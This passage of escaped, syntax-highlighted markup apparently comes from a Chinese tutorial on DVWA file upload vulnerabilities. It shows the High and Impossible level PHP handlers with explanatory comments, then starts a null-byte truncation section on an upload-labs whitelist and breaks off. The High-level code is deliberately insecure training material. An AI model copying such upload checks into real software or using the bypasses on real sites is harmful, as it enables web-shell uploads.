&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$target_path&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2"> succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Invalid file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded. We can only accept JPEG or PNG images.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="high-1">High&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-PHP" data-lang="PHP">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Upload&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Where are we going to be writing to?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">DVWA_WEB_PAGE_TO_ROOT&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s2">&amp;#34;hackable/uploads/&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$target_path&lt;/span> &lt;span class="o">.=&lt;/span> &lt;span class="nx">basename&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// File information
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">substr&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">strrpos&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;size&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$uploaded_tmp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;tmp_name&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Is it an image?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 对比上面多验证了文件的后缀名
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;jpg&amp;#34;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;jpeg&amp;#34;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;png&amp;#34;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100000&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="c1">// 函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">getimagesize&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_tmp&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 因此要求上传文件名形式必须是”*.jpg”、”*.jpeg” 、”*.png”之一
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// Can we move the file to the upload folder?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">move_uploaded_file&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_tmp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// No
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Yes!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nv">$target_path&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2"> succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Invalid file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded. We can only accept JPEG or PNG images.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="impossible">Impossible&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-PHP" data-lang="PHP">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;Upload&amp;#39;&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Check Anti-CSRF token
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">checkToken&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$_REQUEST&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;user_token&amp;#39;&lt;/span> &lt;span class="p">],&lt;/span> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;session_token&amp;#39;&lt;/span> &lt;span class="p">],&lt;/span> &lt;span class="s1">&amp;#39;index.php&amp;#39;&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// File information
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">substr&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">strrpos&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;size&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$uploaded_type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;type&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="nv">$uploaded_tmp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;uploaded&amp;#39;&lt;/span> &lt;span class="p">][&lt;/span> &lt;span class="s1">&amp;#39;tmp_name&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
&lt;span class="c1">// Where are we going to be writing to?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">DVWA_WEB_PAGE_TO_ROOT&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;hackable/uploads/&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">//$target_file = basename( $uploaded_name, &amp;#39;.&amp;#39; . $uploaded_ext ) . &amp;#39;-&amp;#39;;
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// MD5 加密
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$target_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">uniqid&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$temp_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">ini_get&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;upload_tmp_dir&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">sys_get_temp_dir&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">ini_get&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s1">&amp;#39;upload_tmp_dir&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nv">$temp_file&lt;/span> &lt;span class="o">.=&lt;/span> &lt;span class="nx">DIRECTORY_SEPARATOR&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">uniqid&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$uploaded_name&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c1">// Is it an image?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;jpg&amp;#39;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;jpeg&amp;#39;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">strtolower&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_ext&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;png&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_size&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100000&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;image/jpeg&amp;#39;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nv">$uploaded_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;image/png&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;span class="nx">getimagesize&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_tmp&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;image/jpeg&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nv">$img&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">imagecreatefromjpeg&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_tmp&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nx">imagejpeg&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$img&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$temp_file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">100&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nv">$img&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">imagecreatefrompng&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$uploaded_tmp&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="nx">imagepng&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$img&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$temp_file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">9&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">imagedestroy&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$img&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="c1">// Can we move the file to the web root from the temp folder?
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">rename&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$temp_file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="nx">getcwd&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nx">DIRECTORY_SEPARATOR&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target_path&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="nv">$target_file&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Yes!
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;pre&amp;gt;&amp;lt;a href=&amp;#39;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">target_path}${target_file}&amp;#39;&amp;gt;${target_file&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;lt;/a&amp;gt; succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// No
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Delete any temp files
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nx">file_exists&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$temp_file&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span>
&lt;span class="nx">unlink&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$temp_file&lt;/span> &lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// Invalid file
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded. We can only accept JPEG or PNG images.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Generate Anti-CSRF token
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nx">generateSessionToken&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="extension">Extension&lt;/h3>
&lt;p>&lt;strong>00%截断&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-PHP" data-lang="PHP">&lt;span class="nv">$is_upload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">$msg&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">null&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;submit&amp;#39;&lt;/span>&lt;span class="p">])){&lt;/span>
&lt;span class="c1">// 白名单
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nv">$ext_arr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;jpg&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;png&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;gif&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nv">$file_ext&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">substr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;upload_file&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="nx">strrpos&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_FILES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;upload_file&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="s2">&amp;#34;.&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">in_array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$file_ext&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$ext_arr&lt;/span>&lt;span class="p">)){&lt;/span>
